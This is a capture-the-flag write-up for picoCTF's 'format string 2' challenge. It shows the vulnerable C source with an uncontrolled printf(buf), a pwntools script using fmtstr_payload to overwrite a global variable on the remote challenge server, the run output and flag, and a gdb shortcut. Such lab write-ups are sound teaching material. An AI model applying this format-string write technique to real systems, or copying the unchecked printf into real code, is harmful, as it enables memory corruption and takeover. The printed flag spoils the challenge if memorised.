# format string 2

---
AUTHOR: SKRUBLAWD

Description
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!

---


Source code:

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}

```

---

here we can see that we need to make the sus variable = 0x67616c66 to get the flag:

We are goona use pwnlib.fmtstr — Format string bug exploitation tools to solve this challenge

Reference : [fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html)

---


Let's get to the exploit:


```python
from pwn import *
ex = ELF('./vuln')
context.binary = ex
# p = process(ex.path)
p = remote("rhea.picoctf.net", 50564)

payload = fmtstr_payload(14, {ex.sym['sus']: 0x67616c66})

p.sendlineafter(b'say?', payload)
p.interactive()

```

Running the above explit:

```bash
❯ python3 exploit.py
[*] '/home/lynk/picoCTF/format-string-2/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to rhea.picoctf.net on port 50564: Done
[*] Switching to interactive mode

Here's your input:                                                                                                      uc    \x00                                                                                                                                                                                                                                                    \x00aaaaba`@@
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}[*] Got EOF while reading in interactive
$
```

---

flag: ```picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20```

---

There's also another way to playing around:

---

load the binary in gdb.

set a breakpoint in comparison if (sus == 0x67616c66)

change the registers value rax = 0x67616c66

and it will give you the flag.....locallly 

create a fake flag..........to test it out .........


---
